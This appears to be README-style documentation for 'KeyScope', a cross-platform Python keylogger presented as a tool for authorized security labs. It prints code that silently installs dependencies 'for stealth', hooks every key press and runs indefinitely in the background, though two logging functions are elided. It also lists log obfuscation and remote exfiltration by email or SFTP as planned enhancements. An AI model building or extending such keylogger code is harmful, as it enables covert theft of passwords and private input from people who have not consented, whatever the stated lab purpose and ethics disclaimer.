# KeyScope Documentation

## Overview

**KeyScope** is a cross-platform Python-based keylogger that automatically installs its required modules and logs both keystrokes and active window titles with timestamps. The project is intended for use in authorized cybersecurity labs and internship simulations.



## File: [keyscope.py](/keylogger.py)

### 1. Imports and Setup

```python
import os
import sys
import subprocess
import time
from datetime import datetime
import platform
```
- These modules handle file operations, subprocess management, date/time, and platform detection.



### 2. Auto-Installer Function

```python
def install_and_import(package):
    try:
        __import__(package)
    except ImportError:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", package],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(1)
```
- This function imports a package or installs it silently if missing.
- It suppresses output for stealth and cleanliness.



### 3. Install Required Packages

```python
install_and_import("keyboard")
install_and_import("psutil")
```
- Ensures `keyboard` and `psutil` are available before logging begins.

Platform-specific packages:
```python
if platform.system() == "Windows":
    install_and_import("pygetwindow")
elif platform.system() == "Darwin":
    install_and_import("pyobjc-framework-Quartz")
```



### 4. Get Active Window Title

```python
def get_active_window_title():
    ...
```

- **Windows**: Uses `pygetwindow` to fetch current window title.
- **macOS**: Uses `AppKit` via `pyobjc` to detect the active application.
- **Linux**: Uses `xdotool` (assumes it’s installed via system package manager).



### 5. Log File Path

```python
log_file = os.path.expanduser("~\keylog.txt") if platform.system() == "Windows" else os.path.expanduser("~/keylog.txt")
```

- Sets the log file location based on operating system.



### 6. Log Initialization

```python
with open(log_file, "a") as f:
    f.write(f"\n\n[+] Logger started at {datetime.now()}\n")
```

- Appends a header to the log with a start timestamp.



### 7. Keystroke & Window Change Logging

```python
def log_key(event):
    ...
```

- Logs:
    - Timestamp
    - Keystroke
    - Current window (if changed since last recorded)

Uses `keyboard.on_press(log_key)` to register all key presses.


### 8. Execution Loop

```python
keyboard.wait()
```

- Keeps the keylogger running indefinitely in the background.



## Security & Ethics Considerations

- This tool is designed for educational use in secure, authorized environments.
- It should never be deployed or tested without explicit consent and legal authorization.



## Potential Enhancements

- Log file encryption or obfuscation
- Remote exfiltration (email/SFTP) — lab simulation only
- Add GUI or CLI toggles for starting/stopping logging
- Integration with behavior analysis or SIEM lab tools